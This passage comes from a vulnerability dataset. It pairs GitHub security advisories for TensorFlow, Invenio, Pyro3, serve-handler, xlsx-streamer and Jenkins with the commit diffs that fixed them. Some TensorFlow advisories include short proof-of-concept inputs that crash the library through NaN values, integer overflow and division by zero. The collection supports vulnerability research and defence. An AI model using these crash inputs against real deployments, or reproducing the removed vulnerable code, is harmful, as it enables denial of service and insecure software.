'https:\/\/github.com\/inveniosoftware\/invenio-drafts-resources\/raw\/039b0cff1ad4b952000f4d8c3a93f347108b6626\/invenio_drafts_resources%2Fservices%2Frecords%2Fservice.py', 'patch': '@@ -267,10 +267,9 @@ def publish(self, id_, identity, uow=None):\\n               into records)\\n             - Create or update associated (published) record with data\\n         \"\"\"\\n-        self.require_permission(identity, \"publish\")\\n-\\n         # Get the draft\\n         draft = self.draft_cls.pid.resolve(id_, registered_only=False)\\n+        self.require_permission(identity, \"publish\", record=draft)\\n \\n         # Validate the draft strictly - since a draft can be saved with errors\\n         # we do a strict validation here to make sure only valid drafts can be'}}","message_norm":"security: fix missing permission check of publish\n\n* invenio-drafts-resources does not properly check permissions when a\n  record is published. the vulnerability is exploitable in a default\n  installation of inveniordm. an authenticated a user is able via rest\n  api calls to publish draft records of other users if they know the\n  record identifier and the draft validates (e.g. all require fields\n  filled out). an attacker is not able to modify the data in the record,\n  and thus e.g. cannot change a record from restricted to public.","language":"en","entities":"[('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('permission', 'SECWORD', ''), ('permissions', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('exploitable', 'SECWORD', ''), ('validates', 'ACTION', ''), ('attacker', 'FLAW', ''), ('change', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['invenio_drafts_resources\/services\/records\/service.py'])","num_files":1.0},{"index":3489,"vuln_id":"GHSA-xrp2-fhq4-4q3w","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e57fd691c7b0fd00ea3bfe43444f30c1969748b5'}","dataset":"osv","summary":"Segfault if `tf.histogram_fixed_width` is called with NaN values in TensorFlow ### Impact\nThe implementation of [`tf.histogram_fixed_width`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/histogram_op.cc) is vulnerable to a crash when the values array contain `NaN` elements:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.histogram_fixed_width(values=np.nan, value_range=[1,2])\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/histogram_op.cc#L35-L74) assumes that all floating point operations are defined and then converts a floating point result to an integer index:\n\n```cc\nindex_to_bin.device(d) =\n    ((values.cwiseMax(value_range(0)) - values.constant(value_range(0)))\n         .template cast<double>() \/\n     step)\n        .cwiseMin(nbins_minus_1)\n        .template cast<int32>();\n```\n\nIf `values` contains `NaN` then the result of the division is still `NaN` and the cast to `int32` would result in a crash.\n\nThis only occurs on the CPU implementation.\n\n### Patches\nWe have patched the issue in GitHub commit [e57fd691c7b0fd00ea3bfe43444f30c1969748b5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e57fd691c7b0fd00ea3bfe43444f30c1969748b5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https:\/\/github.com\/tensorflow\/tensorflow\/issues\/45770).","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e57fd691c7b0fd00ea3bfe43444f30c1969748b5","commit_sha":"e57fd691c7b0fd00ea3bfe43444f30c1969748b5","patch":"SINGLE","chain_ord":"['e57fd691c7b0fd00ea3bfe43444f30c1969748b5']","before_first_fix_commit":"{'484b5e8836454dbc93380176ae5eeeab02cc63c0'}","last_fix_commit":"e57fd691c7b0fd00ea3bfe43444f30c1969748b5","chain_ord_pos":1.0,"commit_datetime":"04\/20\/2022, 18:35:47","message":"Prevent crash when histogram is called with NaN values.\n\nFixes #45770\n\nPiperOrigin-RevId: 443149951","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 11, 'deletions': 2, 'total': 13}","files":"{'tensorflow\/core\/kernels\/histogram_op.cc': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e57fd691c7b0fd00ea3bfe43444f30c1969748b5\/tensorflow%2Fcore%2Fkernels%2Fhistogram_op.cc', 'patch': '@@ -50,6 +50,15 @@ struct HistogramFixedWidthFunctor<CPUDevice, T, Tout> {\\n                         static_cast<double>(nbins);\\n     const double nbins_minus_1 = static_cast<double>(nbins - 1);\\n \\n+    \/\/ We cannot handle NANs in the algorithm below (due to the case to int32)\\n+    const Eigen::Tensor<int32, 1, 1> nans_tensor =\\n+        values.isnan().template cast<int32>();\\n+    const Eigen::Tensor<int32, 0, 1> reduced_tensor = nans_tensor.sum();\\n+    const int num_nans = reduced_tensor(0);\\n+    if (num_nans > 0) {\\n+      return errors::InvalidArgument(\"Histogram values must not contain NaN\");\\n+    }\\n+\\n     \/\/ The calculation is done by finding the slot of each value in `values`.\\n     \/\/ With [a, b]:\\n     \/\/   step = (b - a) \/ nbins\\n@@ -98,12 +107,12 @@ class HistogramFixedWidthOp : public OpKernel {\\n     const auto nbins = nbins_tensor.scalar<int32>()();\\n \\n     OP_REQUIRES(\\n-        ctx, (value_range(0) < value_range(1)),\\n+        ctx, value_range(0) < value_range(1),\\n         errors::InvalidArgument(\"value_range should satisfy value_range[0] < \"\\n                                 \"value_range[1], but got \\'[\",\\n                                 value_range(0), \", \", value_range(1), \"]\\'\"));\\n     OP_REQUIRES(\\n-        ctx, (nbins > 0),\\n+        ctx, nbins > 0,\\n         errors::InvalidArgument(\"nbins should be a positive number, but got \\'\",\\n                                 nbins, \"\\'\"));'}}","message_norm":"prevent crash when histogram is called with nan values.\n\nfixes #45770\n\npiperorigin-revid: 443149951","language":"en","entities":"[('prevent', 'ACTION', ''), ('fixes', 'ACTION', ''), ('#45770', 'ISSUE', ''), ('443149951', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/histogram_op.cc'])","num_files":1.0},{"index":3492,"vuln_id":"GHSA-xrr4-74mc-rpjc","cwe_id":"{'CWE-59'}","score":7.5,"chain":"{'https:\/\/github.com\/irmen\/Pyro3\/commit\/554e095a62c4412c91f981e72fd34a936ac2bf1e'}","dataset":"osv","summary":"Pyro mishandles pid files in temporary directory locations and opening the pid file as root pyro before 3.15 unsafely handles pid files in temporary directory locations and opening the pid file as root. An attacker can use this flaw to overwrite arbitrary files via symlinks.","published_date":"2018-08-21","chain_len":1,"project":"https:\/\/github.com\/irmen\/Pyro3","commit_href":"https:\/\/github.com\/irmen\/Pyro3\/commit\/554e095a62c4412c91f981e72fd34a936ac2bf1e","commit_sha":"554e095a62c4412c91f981e72fd34a936ac2bf1e","patch":"SINGLE","chain_ord":"['554e095a62c4412c91f981e72fd34a936ac2bf1e']","before_first_fix_commit":"{'1df908f8e8bd3eaf0fd2f1b80d38405f6a10328d'}","last_fix_commit":"554e095a62c4412c91f981e72fd34a936ac2bf1e","chain_ord_pos":1.0,"commit_datetime":"09\/01\/2011, 13:32:40","message":"changed pidfile location because of security vulnerability, debian bug #631912","author":"irmen","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'Pyro\/ext\/daemonizer.py': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/irmen\/Pyro3\/raw\/554e095a62c4412c91f981e72fd34a936ac2bf1e\/Pyro%2Fext%2Fdaemonizer.py', 'patch': '@@ -47,7 +47,9 @@ class Daemonizer:\\n     \"\"\"\\n     def __init__(self, pidfile=None):\\n         if not pidfile:\\n-            self.pidfile = \"\/tmp\/%s.pid\" % self.__class__.__name__.lower()\\n+            # PID file moved out of \/tmp to avoid security vulnerability\\n+            # changed by Debian maintainer per Debian bug #631912\\n+            self.pidfile = \"\/var\/run\/pyro-%s.pid\" % self.__class__.__name__.lower()\\n         else:\\n             self.pidfile = pidfile\\n \\n@@ -121,12 +123,16 @@ def main_loop(self):\\n \\n     def process_command_line(self, argv, verbose=1):\\n         usage = \"usage:  %s  start | stop | restart | status | debug \" \\\\\\n+                \"[--pidfile=...] \" \\\\\\n                 \"(run as non-daemon)\" % os.path.basename(argv[0])\\n         if len(argv) < 2:\\n             print usage\\n             raise SystemExit\\n         else:\\n             operation = argv[1]\\n+            if len(argv) > 2 and argv[2].startswith(\\'--pidfile=\\') and \\\\\\n+                len(argv[2]) > len(\\'--pidfile=\\'):\\n+                self.pidfile = argv[2][len(\\'--pidfile=\\'):]\\n         pid = self.get_pid()\\n         if operation == \\'status\\':\\n             if self.is_process_running():'}}","message_norm":"changed pidfile location because of security vulnerability, debian bug #631912","language":"en","entities":"[('changed', 'ACTION', ''), ('security', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('bug', 'FLAW', ''), ('#631912', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Pyro\/ext\/daemonizer.py'])","num_files":1.0},{"index":3497,"vuln_id":"GHSA-xvjm-fvxx-q3hv","cwe_id":"{'CWE-190'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60'}","dataset":"osv","summary":"CHECK-fail due to integer overflow ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  caused by an integer overflow in constructing a new tensor shape:\n\n```python\nimport tensorflow as tf\n\ninput_layer = 2**60-1\nsparse_data = tf.raw_ops.SparseSplit(\n    split_dim=1, \n    indices=[(0, 0), (0, 1), (0, 2), \n    (4, 3), (5, 0), (5, 1)],\n    values=[1.0, 1.0, 1.0, 1.0, 1.0, 1.0],\n    shape=(input_layer, input_layer),\n    num_split=2,\n    name=None\n    )\n```\n  \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0908c2f2397c099338b901b067f6495a5b96760b\/tensorflow\/core\/kernels\/sparse_split_op.cc#L66-L70) builds a dense shape without checking that the dimensions would not result in overflow:\n\n```cc\nsparse::SparseTensor sparse_tensor;\nOP_REQUIRES_OK(context,\n               sparse::SparseTensor::Create(\n                 input_indices, input_values,\n                 TensorShape(input_shape.vec<int64>()), &sparse_tensor));\n```\n\nThe [`TensorShape` constructor](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f9896890c4c703ae0a0845394086e2e1e523299\/tensorflow\/core\/framework\/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/6f9896890c4c703ae0a0845394086e2e1e523299\/tensorflow\/core\/framework\/tensor_shape.cc#L212-L296) returns a non-OK status.\n                    \n```cc               \ntemplate <class Shape>\nTensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate <class Shape>\nStatus TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate <class Shape>\nStatus TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial && (num_elements() < 0 || size < 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements < 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by researchers from University of Virginia and University of California, Santa Barbara.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60","commit_sha":"4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60","patch":"SINGLE","chain_ord":"['4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60']","before_first_fix_commit":"{'0908c2f2397c099338b901b067f6495a5b96760b'}","last_fix_commit":"4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 22:55:00","message":"Prevent overflow in sparse op\n\nPiperOrigin-RevId: 372442006\nChange-Id: I60fe31cd7e56fb3501e97c63500caf902ddeee96","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 10, 'deletions': 3, 'total': 13}","files":"{'tensorflow\/core\/kernels\/sparse_split_op.cc': {'additions': 10, 'deletions': 3, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60\/tensorflow%2Fcore%2Fkernels%2Fsparse_split_op.cc', 'patch': '@@ -63,11 +63,18 @@ class SparseSplitOp : public OpKernel {\\n                                         input_shape.vec<int64>()(axis),\\n                                         \"), got \", num_split_));\\n \\n+    \/\/ Prevent overflow by constructing the dense shape separately\\n+    TensorShape dense_shape;\\n+    const auto input_shape_flat = input_shape.flat<int64>();\\n+    for (int i = 0; i < input_shape.NumElements(); i++) {\\n+      OP_REQUIRES_OK(context,\\n+                     dense_shape.AddDimWithStatus(input_shape_flat(i)));\\n+    }\\n+\\n     sparse::SparseTensor sparse_tensor;\\n     OP_REQUIRES_OK(context,\\n-                   sparse::SparseTensor::Create(\\n-                       input_indices, input_values,\\n-                       TensorShape(input_shape.vec<int64>()), &sparse_tensor));\\n+                   sparse::SparseTensor::Create(input_indices, input_values,\\n+                                                dense_shape, &sparse_tensor));\\n \\n     std::vector<sparse::SparseTensor> outputs;\\n     OP_REQUIRES_OK(context, sparse::SparseTensor::Split<T>('}}","message_norm":"prevent overflow in sparse op\n\npiperorigin-revid: 372442006\nchange-id: i60fe31cd7e56fb3501e97c63500caf902ddeee96","language":"nl","entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('372442006', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_split_op.cc'])","num_files":1.0},{"index":3498,"vuln_id":"GHSA-xvm2-9xvc-hx7f","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/monitorjbl\/excel-streaming-reader\/commit\/0749c7b9709db078ccdeada16d46a34bc2910c73'}","dataset":"osv","summary":"Improper Restriction of XML External Entity Reference in com.monitorjbl:xlsx-streamer ### Impact\nPrior to xlsx-streamer 2.1.0, the XML parser that was used did not apply all the necessary settings to prevent XML Entity Expansion issues.\n\n### Patches\nUpgrade to version 2.1.0.\n\n### Workarounds\nNo known workaround.\n\n### References\nhttps:\/\/github.com\/monitorjbl\/excel-streaming-reader\/commit\/0749c7b9709db078ccdeada16d46a34bc2910c73\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [monitorjbl\/excel-streaming-reader](https:\/\/github.com\/monitorjbl\/excel-streaming-reader)","published_date":"2022-03-02","chain_len":1,"project":"https:\/\/github.com\/monitorjbl\/excel-streaming-reader","commit_href":"https:\/\/github.com\/monitorjbl\/excel-streaming-reader\/commit\/0749c7b9709db078ccdeada16d46a34bc2910c73","commit_sha":"0749c7b9709db078ccdeada16d46a34bc2910c73","patch":"SINGLE","chain_ord":"['0749c7b9709db078ccdeada16d46a34bc2910c73']","before_first_fix_commit":"{'62470065c35871076ad14480d2df26d9c5c3700a'}","last_fix_commit":"0749c7b9709db078ccdeada16d46a34bc2910c73","chain_ord_pos":1.0,"commit_datetime":"11\/10\/2018, 01:17:35","message":"Updating readme for security release","author":"Taylor Jones","comments":null,"stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'README.md': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/monitorjbl\/excel-streaming-reader\/raw\/0749c7b9709db078ccdeada16d46a34bc2910c73\/README.md', 'patch': \"@@ -1,5 +1,9 @@\\n [![Run Status](https:\/\/api.shippable.com\/projects\/55cfbb00edd7f2c052a980a5\/badge?branch=master)](https:\/\/app.shippable.com\/projects\/55cfbb00edd7f2c052a980a5)\\n \\n+# !!! Security Alert !!!\\n+\\n+Update to the latest version (2.1.0) **as soon as possible** to fix a critical vulnerability. The Xerxes XML parsing library that Excel Streaming Reader uses defaulted to allowing [entity expansion](https:\/\/www.owasp.org\/index.php\/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet), which could be exploited by an attacker to read arbitrary data from your system. The latest versions of Excel Streaming Reader do not allow this and will throw a `ParsingException` if a workbook contains an XML document with an entity declaration.\\n+\\n # Excel Streaming Reader\\n \\n If you've used [Apache POI](http:\/\/poi.apache.org) in the past to read in Excel files, you probably noticed that it's not very memory efficient. Reading in an entire workbook will cause a severe memory usage spike, which can wreak havoc on a server. \\n@@ -23,7 +27,7 @@ To use it, add this to your POM:\\n   <dependency>\\n     <groupId>com.monitorjbl<\/groupId>\\n     <artifactId>xlsx-streamer<\/artifactId>\\n-    <version>2.0.0<\/version>\\n+    <version>2.1.0<\/version>\\n   <\/dependency>\\n <\/dependencies>  \\n ```\\n@@ -106,7 +110,7 @@ This library uses SLF4j logging. This is a rare use case, but you can plug in yo\\n   <dependency>\\n     <groupId>com.monitorjbl<\/groupId>\\n     <artifactId>xlsx-streamer<\/artifactId>\\n-    <version>2.0.0<\/version>\\n+    <version>2.1.0<\/version>\\n   <\/dependency>\\n   <dependency>\\n     <groupId>org.slf4j<\/groupId>\"}}","message_norm":"updating readme for security release","language":"en","entities":"[('updating', 'ACTION', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['README.md'])","num_files":1.0},{"index":3502,"vuln_id":"GHSA-xw79-hhv6-578c","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/zeit\/serve-handler\/commit\/65b4d4183a31a8076c78c40118acb0ca1b64f620'}","dataset":"osv","summary":"Cross-Site Scripting in serve Versions of `serve` prior to 10.0.2 are vulnerable to Cross-Site Scripting (XSS). The package does not encode output, allowing attackers to execute arbitrary JavaScript in the victim's browser if user-supplied input is rendered.\n\n\n## Recommendation\n\nUpgrade to version 10.0.2 or later.","published_date":"2020-09-11","chain_len":1,"project":"https:\/\/github.com\/zeit\/serve-handler","commit_href":"https:\/\/github.com\/zeit\/serve-handler\/commit\/65b4d4183a31a8076c78c40118acb0ca1b64f620","commit_sha":"65b4d4183a31a8076c78c40118acb0ca1b64f620","patch":"SINGLE","chain_ord":"['65b4d4183a31a8076c78c40118acb0ca1b64f620']","before_first_fix_commit":"{'2b3be81a46e09fc5f8bc2c69a5311d439dac74af'}","last_fix_commit":"65b4d4183a31a8076c78c40118acb0ca1b64f620","chain_ord_pos":1.0,"commit_datetime":"09\/24\/2018, 17:05:10","message":"Interpolate template variables correctly (#64)","author":"Leo Lamprecht","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'src\/directory.jst': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/vercel\/serve-handler\/raw\/65b4d4183a31a8076c78c40118acb0ca1b64f620\/src%2Fdirectory.jst', 'patch': '@@ -4,7 +4,7 @@\\n     <meta charset=\"utf-8\">\\n     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\\n \\n-    <title>Files within {{=it.directory}}<\/title>\\n+    <title>Files within {{!it.directory}}<\/title>\\n \\n \\t<style>\\n \\t\\tbody {\\n@@ -187,7 +187,7 @@\\n           <i>Index of&nbsp;<\/i>\\n \\n           {{~it.paths :value:index}}\\n-            <a href=\"\/{{=value.url}}\">{{=value.name}}<\/a>\\n+            <a href=\"\/{{!value.url}}\">{{!value.name}}<\/a>\\n           {{~}}\\n         <\/h1>\\n \\n@@ -197,9 +197,9 @@\\n       <ul id=\"files\">\\n         {{~it.files :value:index}}\\n           <li>\\n-            <a href=\"{{=value.relative}}\" title=\"{{=value.title}}\" class=\"{{=value.ext}}\">{{=value.base}}<\/a>\\n+            <a href=\"{{!value.relative}}\" title=\"{{!value.title}}\" class=\"{{!value.ext}}\">{{!value.base}}<\/a>\\n \\t\\t\\t{{? value.size}}\\n-\\t\\t\\t\\t<i>{{=value.size}}<\/i>\\n+\\t\\t\\t\\t<i>{{!value.size}}<\/i>\\n \\t\\t\\t{{?}}\\n           <\/li>\\n         {{~}}'}}","message_norm":"interpolate template variables correctly (#64)","language":"en","entities":"[('#64', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/directory.jst'])","num_files":1.0},{"index":3504,"vuln_id":"GHSA-xw93-v57j-fcgh","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7f283ff806b2031f407db64c4d3edcda8fb9f9f5'}","dataset":"osv","summary":"Division by 0 in `SparseMatMul` ### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.SparseMatMul`:\n\n```python\nimport tensorflow as tf\n\na = tf.constant([100.0, 100.0, 100.0, 100.0], shape=[2, 2], dtype=tf.float32)\nb = tf.constant([], shape=[0, 2], dtype=tf.float32)\n\ntf.raw_ops.SparseMatMul(\n    a=a, b=b, transpose_a=True, transpose_b=True,\n    a_is_sparse=True, b_is_sparse=True)\n``` \n    \nThe division by 0 occurs deep in Eigen code because the `b` tensor is empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [7f283ff806b2031f407db64c4d3edcda8fb9f9f5](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7f283ff806b2031f407db64c4d3edcda8fb9f9f5).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7f283ff806b2031f407db64c4d3edcda8fb9f9f5","commit_sha":"7f283ff806b2031f407db64c4d3edcda8fb9f9f5","patch":"SINGLE","chain_ord":"['7f283ff806b2031f407db64c4d3edcda8fb9f9f5']","before_first_fix_commit":"{'05a63e605a31e86c5dd96c5c8a763eda9ac7bb33'}","last_fix_commit":"7f283ff806b2031f407db64c4d3edcda8fb9f9f5","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 22:00:39","message":"Fix FPE issue in external Eigen source code issue with `tf.raw_ops.SparseMatMul`.\n\nPiperOrigin-RevId: 370992919\nChange-Id: Icfb276fef5fb40928b27c3e44608d2aca72c9fd7","author":"Amit Patankar","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/sparse_matmul_op.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/7f283ff806b2031f407db64c4d3edcda8fb9f9f5\/tensorflow%2Fcore%2Fkernels%2Fsparse_matmul_op.cc', 'patch': '@@ -1039,6 +1039,10 @@ class SparseMatMulOp : public OpKernel {\\n     if (transpose_b) {\\n       \/\/ TODO(agarwal): avoid transposing the matrix here and directly handle\\n       \/\/ transpose in CreateDenseSlices.\\n+      OP_REQUIRES(ctx, right->dim_size(0) != 0,\\n+                  errors::InvalidArgument(\"b has an entry 0 in it\\'s shape.\"));\\n+      OP_REQUIRES(ctx, right->dim_size(1) != 0,\\n+                  errors::InvalidArgument(\"b has an entry 0 in it\\'s shape.\"));\\n       right_tr.reset(\\n           new Tensor(right->dtype(),\\n                      TensorShape({right->dim_size(1), right->dim_size(0)})));'}}","message_norm":"fix fpe issue in external eigen source code issue with `tf.raw_ops.sparsematmul`.\n\npiperorigin-revid: 370992919\nchange-id: icfb276fef5fb40928b27c3e44608d2aca72c9fd7","language":"en","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('issue', 'FLAW', ''), ('issue', 'FLAW', ''), ('370992919', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_matmul_op.cc'])","num_files":1.0},{"index":3591,"vuln_id":"GHSA-qpg9-83fv-x9ch","cwe_id":"{'CWE-79'}","score":null,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/d393c7e9ba3ec44953ef1f8b11839421e2649ee7', 'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/8eb632dda219ec8796420ce58d9564cddf8f8f93'}","dataset":"osv","summary":"Improper Neutralization of Input During Web Page Generation in Jenkins The f:validateButton form control for the Jenkins UI did not properly escape job URLs in Jenkins 2.171 and earlier and Jenkins LTS 2.164.1 and earlier, resulting in a cross-site scripting (XSS) vulnerability exploitable by users with the ability to control job names.","published_date":"2022-05-13","chain_len":2,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/d393c7e9ba3ec44953ef1f8b11839421e2649ee7","commit_sha":"d393c7e9ba3ec44953ef1f8b11839421e2649ee7","patch":"MULTI","chain_ord":"['8eb632dda219ec8796420ce58d9564cddf8f8f93', 'd393c7e9ba3ec44953ef1f8b11839421e2649ee7']","before_first_fix_commit":"{'bcb8ae87d5d9d348abf80039de2921eb3ced8959'}","last_fix_commit":"d393c7e9ba3ec44953ef1f8b11839421e2649ee7","chain_ord_pos":2.0,"commit_datetime":"03\/26\/2019, 20:54:27","message":"[SECURITY-1327] Adapt test to new HTML Unit","author":"Daniel Beck","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'test\/src\/test\/java\/lib\/form\/ValidateButtonSEC1327Test.java': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/d393c7e9ba3ec44953ef1f8b11839421e2649ee7\/test%2Fsrc%2Ftest%2Fjava%2Flib%2Fform%2FValidateButtonSEC1327Test.java', 'patch': '@@ -24,7 +24,9 @@\\n package lib.form;\\n \\n import com.gargoylesoftware.htmlunit.html.HtmlButton;\\n+import com.gargoylesoftware.htmlunit.html.HtmlElement;\\n import com.gargoylesoftware.htmlunit.html.HtmlPage;\\n+import com.gargoylesoftware.htmlunit.html.DomNodeList;\\n import hudson.model.FreeStyleProject;\\n import hudson.model.Job;\\n import hudson.model.JobProperty;\\n@@ -72,8 +74,8 @@ private void checkValidateButtonWork(String projectName) throws Exception {\\n         HtmlPage htmlPage = wc.goTo(p.getUrl() + \"\/configure\");\\n         assertThat(htmlPage.getWebResponse().getStatusCode(), is(200));\\n \\n-        List<HtmlButton> inputs = htmlPage.getDocumentElement().getHtmlElementsByTagName(\"button\");\\n-        HtmlButton validateButton = inputs.stream()\\n+         DomNodeList<HtmlElement> inputs = htmlPage.getDocumentElement().getElementsByTagName(\"button\");\\n+         HtmlButton validateButton = (HtmlButton) inputs.stream()\\n                 .filter(i -> i.getTextContent().contains(\"testInjection\"))\\n                 .findFirst()\\n                 .orElseThrow(() -> new AssertionError(\"Validate button not found\"));'}}","message_norm":"[security-1327] adapt test to new html unit","language":"en","entities":"[('security-1327', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['test\/src\/test\/java\/lib\/form\/ValidateButtonSEC1327Test.java'])","num_files":1.0},{"index":5250,"vuln_id":"GHSA-v5c9-mmw9-829q","cwe_id":"{'CWE-94'}","score":null,"chain":"{'https:\/\/github.com\/PHPMailer\/PHPMailer\/commit\/8beacc646acb67c995aea10ac5585970efc7355a'}","dataset":"osv","summary":"PHPMailer susceptible to arbitrary code execution html2text.php in Chuggnutt HTML to Text Converter, as used in PHPMailer before 5.2.10, RoundCube Webmail (roundcubemail) 0.2-1.alpha and 0.2-3.beta, Mahara, and AtMail Open 1.03, allows remote attackers to execute arbitrary code via crafted input that is processed by the preg_replace function with the eval 